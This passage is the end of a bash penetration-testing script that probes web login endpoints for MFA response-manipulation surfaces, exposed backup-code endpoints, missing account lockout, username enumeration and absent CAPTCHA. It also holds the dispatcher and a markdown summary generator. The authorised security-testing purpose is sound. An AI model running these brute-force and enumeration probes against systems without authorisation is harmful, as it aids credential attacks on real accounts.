                    "mfa-ratelimit"
            else
                log_ok "T09: Rate-limiting observed (got 429/423) — brute-force mitigated"
                echo "  PASS: rate-limit enforced"
            fi
        fi

        # --- Response manipulation surface check ---
        if [[ $found_ep -eq 1 ]]; then
            echo ""
            echo "--- Response Manipulation Surface Check ---"
            local resp_body hc2
            resp_body=$(_curl -s -w "\n%{http_code}" -X POST "$mfa_ep" \
                -H "Content-Type: application/json" \
                -d '{"code":"000000"}' \
                "${auth_args[@]+"${auth_args[@]}"}" 2>/dev/null || true)
            hc2=$(echo "$resp_body" | tail -1)
            local body_only
            body_only=$(echo "$resp_body" | head -n -1)
            echo "  HTTP ${hc2}"
            echo "  Body (first 400 chars): ${body_only:0:400}"

            if echo "$body_only" | grep -qiE '"success"\s*:\s*false|"verified"\s*:\s*false|"valid"\s*:\s*false|"authenticated"\s*:\s*false'; then
                _SUMMARY_MFA=1
                emit_finding "HIGH" \
                    "MFA Response Contains Boolean Success Flag — Manipulation Surface" \
                    "The MFA endpoint at ${mfa_ep} returns a JSON boolean flag (success/verified/valid/authenticated: false) on failure. This pattern is susceptible to client-side response manipulation or proxy interception where an attacker intercepts the response and flips the flag to true, bypassing MFA entirely without knowing the correct OTP." \
                    "Validate MFA status server-side via session state. Do not rely on client-submitted or easily intercepted boolean flags. Issue a signed, server-side token only after verified OTP validation." \
                    "mfa-respmanip"
            else
                log_ok "T09: No obvious boolean flag in MFA response body"
            fi
        fi

        # --- Backup code endpoint exposure check ---
        echo ""
        echo "--- Backup Code Endpoint Exposure ---"
        local -a backup_candidates=(
            "${base_url}/api/mfa/backup-codes"
            "${base_url}/api/2fa/backup"
            "${base_url}/api/auth/recovery-codes"
            "${base_url}/api/account/backup-codes"
            "${base_url}/auth/recovery"
            "${base_url}/api/v1/mfa/recovery"
        )
        local backup_exposed=0
        for ep in "${backup_candidates[@]}"; do
            local hc
            hc=$(_curl -s -o /dev/null -w "%{http_code}" -X GET "$ep" \
                "${auth_args[@]+"${auth_args[@]}"}" 2>/dev/null || true)
            echo "  GET ${ep} -> HTTP ${hc}"
            if [[ "$hc" =~ ^(200|201)$ ]]; then
                backup_exposed=1
                _SUMMARY_MFA=1
                emit_finding "MEDIUM" \
                    "Backup/Recovery Code Endpoint Accessible Without Re-Auth" \
                    "The backup code endpoint ${ep} returned HTTP ${hc} without requiring step-up authentication or re-confirmation of credentials. Exposed backup codes allow permanent MFA bypass if the primary credential is compromised." \
                    "Require full re-authentication (password + primary factor) before displaying or regenerating backup/recovery codes. Apply rate-limiting and audit logging to this endpoint." \
                    "mfa-backupcodes"
                break
            fi
        done
        [[ $backup_exposed -eq 0 ]] && log_ok "T09: No backup code endpoints returned 200/201 unauthenticated"

        echo ""
        echo "=== T09 COMPLETE — Summary flag: ${_SUMMARY_MFA} ==="
    } | tee -a "$evfile" >&2

    [[ "${_SUMMARY_MFA:-0}" -eq 0 ]] && log_ok "T09: No 2FA/MFA bypass surface detected in automated probes"
}

# =============================================================================
# MRK:10_T10 — T10 ACCOUNT LOCKOUT & PASSWORD POLICY | t10,lockout,password,bruteforce | LXXXX-XXXX
# NAV-RULE: read-toc-first
# =============================================================================

test_10_t10_account_lockout() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "sso-t10-account-lockout" "txt")"
    log "T10: Account Lockout & Password Policy — ${base_url}"
    _SUMMARY_LOCKOUT=0
    local -a auth_args
    mapfile -t auth_args < <(_auth_args)

    {
        echo "=== T10: Account Lockout & Password Policy ==="
        echo "Target: ${base_url}"
        echo "Date:   $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
        echo ""

        # --- Login endpoint discovery ---
        echo "--- Login Endpoint Discovery ---"
        local login_ep="" found_login=0
        local -a login_candidates=(
            "${base_url}/api/auth/login"
            "${base_url}/api/login"
            "${base_url}/api/v1/auth/login"
            "${base_url}/api/v2/auth/login"
            "${base_url}/auth/login"
            "${base_url}/login"
            "${base_url}/api/session"
            "${base_url}/api/auth/signin"
            "${base_url}/api/signin"
        )
        for ep in "${login_candidates[@]}"; do
            local hc
            hc=$(_curl -s -o /dev/null -w "%{http_code}" -X POST "$ep" \
                -H "Content-Type: application/json" \
                -d '{"username":"probe_orc_test_user","password":"WrongPass1!"}' \
                "${auth_args[@]+"${auth_args[@]}"}" 2>/dev/null || true)
            echo "  ${ep} -> HTTP ${hc}"
            if [[ "$hc" =~ ^(200|400|401|403|422|429)$ ]]; then
                login_ep="$ep"
                found_login=1
                log_info "T10: Login endpoint candidate: ${ep} (HTTP ${hc})"
                break
            fi
        done

        if [[ $found_login -eq 0 ]]; then
            echo "  No login endpoint responded with recognisable code — skipping lockout probe"
        fi

        # --- Account lockout probe (8 failed attempts against nonexistent user) ---
        if [[ $found_login -eq 1 ]]; then
            echo ""
            echo "--- Account Lockout Probe (8 failed attempts, nonexistent user) ---"
            local got_lockout=0 attempt
            for attempt in 1 2 3 4 5 6 7 8; do
                local rc
                rc=$(_curl -s -o /dev/null -w "%{http_code}" -X POST "$login_ep" \
                    -H "Content-Type: application/json" \
                    -d "{\"username\":\"orc_probe_nonexistent_x77z@probe.orc\",\"password\":\"WrongPass${attempt}!Orc\",\"email\":\"orc_probe@probe.orc\"}" \
                    "${auth_args[@]+"${auth_args[@]}"}" 2>/dev/null || true)
                echo "  attempt=${attempt} -> HTTP ${rc}"
                if [[ "$rc" =~ ^(423|429)$ ]]; then
                    got_lockout=1
                    log_ok "T10: Lockout/rate-limit triggered after ${attempt} attempts (HTTP ${rc})"
                    break
                fi
            done

            if [[ $got_lockout -eq 0 ]]; then
                _SUMMARY_LOCKOUT=1
                emit_finding "MEDIUM" \
                    "No Account Lockout After 8 Failed Login Attempts" \
                    "The login endpoint ${login_ep} accepted 8 sequential failed authentication attempts without returning HTTP 423 (Locked) or 429 (Too Many Requests). The absence of account lockout or progressive rate-limiting enables credential-stuffing and online brute-force attacks against valid accounts." \
                    "Implement account lockout (e.g., soft-lock for 15 minutes after 5 failures) or progressive CAPTCHA challenges. Apply per-IP and per-account rate-limiting. Log and alert on repeated authentication failures." \
                    "lockout-absent"
            fi
        fi

        # --- Username enumeration via HTTP status delta ---
        if [[ $found_login -eq 1 ]]; then
            echo ""
            echo "--- Username Enumeration via HTTP Status Delta ---"
            local rc_existing rc_nonexistent
            rc_existing=$(_curl -s -o /dev/null -w "%{http_code}" -X POST "$login_ep" \
                -H "Content-Type: application/json" \
                -d '{"username":"admin","password":"OrcProbeWrong!9z3"}' \
                "${auth_args[@]+"${auth_args[@]}"}" 2>/dev/null || true)
            rc_nonexistent=$(_curl -s -o /dev/null -w "%{http_code}" -X POST "$login_ep" \
                -H "Content-Type: application/json" \
                -d '{"username":"orc_does_not_exist_88qqz","password":"OrcProbeWrong!9z3"}' \
                "${auth_args[@]+"${auth_args[@]}"}" 2>/dev/null || true)
            echo "  admin (likely exists):       HTTP ${rc_existing}"
            echo "  nonexistent_user:            HTTP ${rc_nonexistent}"

            if [[ "$rc_existing" != "$rc_nonexistent" ]]; then
                _SUMMARY_LOCKOUT=1
                emit_finding "LOW" \
                    "Username Enumeration via Distinct HTTP Response Codes" \
                    "The login endpoint ${login_ep} returns HTTP ${rc_existing} for a plausible username ('admin') and HTTP ${rc_nonexistent} for a random nonexistent username. Differing status codes allow attackers to enumerate valid usernames prior to targeted credential attacks." \
                    "Return a uniform HTTP status (401 Unauthorized) for all failed authentication attempts regardless of whether the username exists. Avoid response body or timing differences that distinguish valid from invalid usernames." \
                    "username-enum"
            else
                log_ok "T10: Same HTTP code (${rc_existing}) for existing and nonexistent users — enumeration mitigated at status level"
            fi
        fi

        # --- CAPTCHA / human-check surface note ---
        if [[ $found_login -eq 1 ]]; then
            echo ""
            echo "--- CAPTCHA Surface Check ---"
            local login_body
            login_body=$(_curl -s -X POST "$login_ep" \
                -H "Content-Type: application/json" \
                -d '{"username":"orc_captcha_probe","password":"OrcProbe1!"}' \
                "${auth_args[@]+"${auth_args[@]}"}" 2>/dev/null | head -c 800 || true)
            echo "  Body excerpt: ${login_body:0:400}"
            if echo "$login_body" | grep -qiE 'captcha|recaptcha|hcaptcha|turnstile|cf-challenge'; then
                log_ok "T10: CAPTCHA challenge mechanism detected in login response"
                echo "  CAPTCHA: PRESENT"
            else
                echo "  CAPTCHA: not detected in response body (may be JS-rendered)"
                emit_finding "INFO" \
                    "No CAPTCHA Detected on Login Endpoint (Automated Probe)" \
                    "The login endpoint ${login_ep} did not return CAPTCHA challenge indicators in the response body during automated probe. If CAPTCHA is not enforced server-side, automated credential-stuffing attacks are not mitigated by a human-verification gate. Note: JS-rendered CAPTCHA may not be visible to this probe." \
                    "Ensure server-side CAPTCHA validation (reCAPTCHA v3, hCaptcha, or Cloudflare Turnstile) is enforced on the login endpoint and is not bypassable by omitting the CAPTCHA token. Test with an empty or missing captcha field." \
                    "lockout-captcha"
            fi
        fi

        echo ""
        echo "=== T10 COMPLETE — Summary flag: ${_SUMMARY_LOCKOUT} ==="
    } | tee -a "$evfile" >&2

    [[ "${_SUMMARY_LOCKOUT:-0}" -eq 0 ]] && log_ok "T10: No account lockout or enumeration issues detected in automated probes"
}

# =============================================================================
# MRK:10_TRUN — PER-TARGET DISPATCHER | trun,target,dispatcher,test | LXXXX-XXXX
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

test_target() {
    local host_port="$1"
    local ip; ip=$(echo "$host_port" | cut -d: -f1)
    local port; port=$(echo "$host_port" | cut -d: -f2)
    [[ -z "$port" ]] && port=443

    _CURRENT_IP="$ip"

    local scheme; scheme=$(_scheme "$port")
    local base_url="${scheme}://${ip}:${port}"

    local ip_slug="${ip//./_}"
    local ev_dir="${EVIDENCE_BASE}/${ip_slug}_${port}"
    mkdir -p "$ev_dir"

    log "========================================================"
    log "TARGET: ${base_url} | Profile: ${PROFILE} | Tier: ${TIER}"
    log "========================================================"

    local reach_code
    reach_code=$(_curl -o /dev/null -w "%{http_code}" "${base_url}/" || true)
    if [[ "$reach_code" == "000" ]]; then
        log_warn "Target ${base_url} unreachable (curl exit 000) — skipping"
        return
    fi
    log_ok "Target reachable: HTTP ${reach_code}"

    # Reset per-target cross-test state
    _SAML_DETECTED=0; _SAML_ACS_URL=""
    _OAUTH_DETECTED=0; _OAUTH_TOKEN_URL=""; _OAUTH_AUTHORIZE_EP=""; _OIDC_DISCOVERY_DOC=""
    _SUMMARY_OAUTH=0; _SUMMARY_FLOW=0; _SUMMARY_TOKEN=0
    _SUMMARY_SAML=0; _SUMMARY_SESSION=0; _SUMMARY_LOGOUT=0
    _SUMMARY_MFA=0; _SUMMARY_LOCKOUT=0
    _FIND_AT_START="${_FIND_CTR}"

    # Dispatch tests — pattern: _test_skip N || test_10_tNN_*()
    _test_skip 1  || test_10_t01_discovery      "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 2  || test_10_t02_oauth_flow     "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 3  || test_10_t03_token_abuse    "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 4  || test_10_t04_oidc           "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 5  || test_10_t05_saml_discovery "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 6  || test_10_t06_saml_probes    "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 7  || test_10_t07_session        "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 8  || test_10_t08_logout         "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 9  || test_10_t09_mfa_bypass     "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 10 || test_10_t10_account_lockout "$base_url" "$ev_dir" "$ip" "$port"

    local target_finds=$(( _FIND_CTR - _FIND_AT_START ))
    log_ok "Target ${base_url} complete — ${target_finds} finding(s)"

    echo "SUMMARY_ROW|${ip}|${port}|${target_finds}|${_SUMMARY_OAUTH}|${_SUMMARY_FLOW}|${_SUMMARY_TOKEN}|${_SUMMARY_SAML}|${_SUMMARY_SESSION}|${_SUMMARY_LOGOUT}|${_SUMMARY_MFA}|${_SUMMARY_LOCKOUT}"
}

# =============================================================================
# MRK:10_MAIN — MAIN ENTRY POINT | main,entry,point,summary | L1206-1330
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

main() {
    log "PT-Orc 10_auth_sso.sh v1.0 — OAuth 2.0 / OIDC / SAML / SSO Attack Surface"
    log "Session: ${SESSION_TS} | Profile: ${PROFILE} | Tier: ${TIER}"
    [[ "${#CURL_PROXY_ARGS[@]}" -gt 0 ]] && log_info "Intercept proxy: ${CURL_PROXY_ARGS[*]}"
    [[ -n "${OAUTH_CLIENT_ID:-}" ]] && log_info "OAuth client_id: ${OAUTH_CLIENT_ID}"
    [[ -n "${SAML_SSO_URL:-}"    ]] && log_info "SAML ACS (pre-configured): ${SAML_SSO_URL}"

    setup_profile

    local -a targets
    mapfile -t targets < <(assemble_targets)

    confirm_scope "${targets[@]}"

    if command -v trail_phase_start &>/dev/null; then
        trail_phase_start "10_auth_sso" "Auth/SSO Review v1.0" "${#targets[@]} targets"
    fi

    local summary_rows=()

    for host_port in "${targets[@]}"; do
        local row
        row=$(test_target "$host_port")
        while IFS= read -r line; do
            if [[ "$line" == SUMMARY_ROW* ]]; then
                summary_rows+=("$line")
            fi
        done <<< "$row"
    done

    # ── Markdown summary ──────────────────────────────────────────────────────
    local summary_md="${SCRIPT_DIR}/working/$(ev_fname "23-authsso-summary" "md")"
    {
        echo "# Auth/SSO Review Summary — ${PROJECT_NAME:-unknown}"
        echo ""
        echo "**Date:** $(date +'%Y-%m-%d %H:%M:%S')"
        echo "**Profile:** ${PROFILE} | **Tier:** ${TIER} | **Tests:** T01-T10"
        echo "**Targets:** ${#targets[@]}"
        [[ "${#CURL_PROXY_ARGS[@]}" -gt 0 ]] && echo "**Proxy:** ${CURL_PROXY_ARGS[*]}"
        [[ -n "${OAUTH_CLIENT_ID:-}"  ]] && echo "**OAuth client_id:** ${OAUTH_CLIENT_ID}"
        echo ""
        echo "## Coverage — OAuth 2.0 / OIDC / SAML / Session"
        echo ""
        echo "| # | Standard | Test | Status |"
        echo "|---|----------|------|--------|"
        echo "| T01 | RFC 6749 / OIDC Core | OAuth/OIDC Endpoint Discovery | $([ "${_T_ENABLED[1]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T02 | RFC 6749 §10 | OAuth Authorization Flow Attacks | $([ "${_T_ENABLED[2]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T03 | RFC 6749 §4.4 | Token Endpoint Abuse | $([ "${_T_ENABLED[3]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T04 | OIDC Core 1.0 | OIDC Probes (JWKS / UserInfo) | $([ "${_T_ENABLED[4]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T05 | SAML 2.0 | SAML Endpoint Discovery | $([ "${_T_ENABLED[5]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T06 | SAML 2.0 §5 | SAML Assertion Probes (deep) | $([ "${_T_ENABLED[6]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped (deep only)") |"
        echo "| T07 | OWASP A02 | Session Management | $([ "${_T_ENABLED[7]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T08 | RFC 7009 | SSO Logout & Token Revocation | $([ "${_T_ENABLED[8]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T09 | OWASP WSTG-AUTHN-06 | 2FA/MFA Bypass Surface | $([ "${_T_ENABLED[9]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T10 | OWASP WSTG-AUTHN-03 | Account Lockout & Password Policy | $([ "${_T_ENABLED[10]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo ""
        echo "## Per-Target Results"
        echo ""
        echo "| Host | Port | Findings | OAuth EP | Flow Vulns | Token Abuse | SAML | Session | Logout | MFA | Lockout |"
        echo "|------|------|----------|----------|------------|-------------|------|---------|--------|-----|---------|"
        for row in "${summary_rows[@]+"${summary_rows[@]}"}"; do
            IFS='|' read -r _ rip rport rfinds roauth rflow rtoken rsaml rsess rlogout rmfa rlock <<< "$row"
            local fo; fo="$( [[ "${roauth:-0}"   -eq 1 ]] && echo "⚠ Yes"  || echo "—")"
            local ff; ff="$( [[ "${rflow:-0}"    -eq 1 ]] && echo "⚠ Yes"  || echo "OK")"
            local ft; ft="$( [[ "${rtoken:-0}"   -eq 1 ]] && echo "⚠ Yes"  || echo "OK")"
            local fs; fs="$( [[ "${rsaml:-0}"    -eq 1 ]] && echo "⚠ Yes"  || echo "—")"
            local fse; fse="$([[ "${rsess:-0}"   -eq 1 ]] && echo "⚠ Yes"  || echo "OK")"
            local fl; fl="$( [[ "${rlogout:-0}"  -eq 1 ]] && echo "⚠ Yes"  || echo "OK")"
            local fmfa; fmfa="$([[ "${rmfa:-0}"  -eq 1 ]] && echo "⚠ Yes"  || echo "OK")"
            local flock; flock="$([[ "${rlock:-0}" -eq 1 ]] && echo "⚠ Yes" || echo "OK")"
            echo "| ${rip} | ${rport} | ${rfinds} | ${fo} | ${ff} | ${ft} | ${fs} | ${fse} | ${fl} | ${fmfa} | ${flock} |"
        done
        echo ""
        echo "## Total Findings: ${_FIND_CTR}"
        echo ""
        echo "### Findings File"
        echo "\`${FINDINGS_FILE}\`"
        echo ""
        echo "### Evidence Directory"
        echo "\`${EVIDENCE_BASE}\`"
        echo ""
        echo "---"
        echo "*Generated by PT-Orc 10_auth_sso.sh v1.0 — TechGuard Labs*"
        echo "*Profile: ${PROFILE} | OAuth 2.0 / OIDC / SAML 2.0 / Session Management*"
    } > "$summary_md"

    log_ok "Summary: ${summary_md}"
    log_ok "Findings: ${FINDINGS_FILE} (${_FIND_CTR} total)"
    log_ok "Evidence: ${EVIDENCE_BASE}"

    if command -v trail_phase_end &>/dev/null; then
        trail_phase_end "10_auth_sso" "${_FIND_CTR} findings" "$summary_md"
    fi

    cat "$summary_md"
}

main "$@"

# L2 NAV:v1 → ./LOCAL-INDEX.md
# L1 ORC-NAV — read MRK:NAV_TOC first; fetch MRK ranges precisely (no default line count)
